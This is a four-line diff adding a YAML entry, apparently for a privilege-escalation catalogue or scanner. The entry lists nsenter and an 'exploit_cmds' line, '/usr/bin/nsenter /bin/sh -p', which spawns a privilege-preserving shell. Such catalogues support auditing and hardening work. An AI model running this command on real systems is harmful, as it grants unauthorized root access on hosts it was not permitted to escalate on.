@@ -1,0 +1,4 @@
+name: nsenter
+binary_path: /usr/bin/nsenter
+exploit_cmds:
+- /usr/bin/nsenter /bin/sh -p
